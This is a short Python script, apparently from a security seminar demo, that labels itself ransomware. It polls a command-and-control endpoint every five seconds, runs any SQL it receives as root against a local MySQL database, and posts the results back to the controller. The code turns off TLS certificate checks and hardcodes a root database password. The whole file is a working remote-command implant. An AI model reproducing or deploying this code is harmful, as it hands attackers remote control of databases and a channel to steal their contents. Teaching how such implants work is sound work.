import requests
import time
import mysql.connector
import urllib3

urllib3.disable_warnings()

def execute_sql(sql):
    try:
        db = mysql.connector.connect(
            host="127.0.0.1",
            user="root",
            password="Leo250262",
            database="seg_seminario"
        )
        cursor = db.cursor()
        cursor.execute(sql)

        if cursor.with_rows:
            result = cursor.fetchall()
        else:
            db.commit()
            result = f"{cursor.rowcount} linha(s) afetada(s)."

        cursor.close()
        db.close()
        return result
    except Exception as e:
        return f"[ERRO] {e}"

url = "https://localhost:8443/api/v1/command"

print("Ransomware iniciado e buscando comandos...")

while True:
    try:
        res = requests.get(url, verify=False)
        command = res.json().get("command", "")

        if command:
            print(f"Executando: {command}")
            result = execute_sql(command)
            print(f"Resultado: {result}")
            requests.post("https://localhost:8443/api/v1/result", json={"output": str(result)}, verify=False)
        else:
            print("Nenhum comando recebido.")
    except Exception as e:
        print(f"[ERRO NA CONEX√ÉO] {e}")

    time.sleep(5)
